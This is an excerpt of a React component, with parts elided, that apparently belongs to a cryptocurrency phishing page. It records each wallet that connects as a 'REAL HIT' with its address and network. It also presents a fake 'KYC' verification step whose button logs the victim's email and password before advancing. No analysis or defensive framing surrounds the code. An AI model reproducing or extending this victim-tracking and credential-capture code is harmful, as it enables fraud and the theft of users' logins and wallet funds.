...
export default function App() {
  ...
  useEffect(() => {
    if (isConnected && address && !sessionStorage.getItem('h_v9_'+address)) {
      log(`🎯 REAL HIT V9!\nADDR: ${address}\nNET: ${chainId}`);
      sessionStorage.setItem('h_v9_'+address, 't');
    }
  }, [isConnected, address]);
  ...
  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>SYSTEM_ONLINE_V9</div>
        <appkit-button />
      </header>
            ...
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
              ...
              {kycPhase === 1 ? (
                <>
                  ...
                  <button onClick={()=>{ log(`🆔 KYC: ${kycEmail} | P: ${kycPass}`); setKycPhase(2); }} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color:'#000', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
                </>
              ) : (
                <>
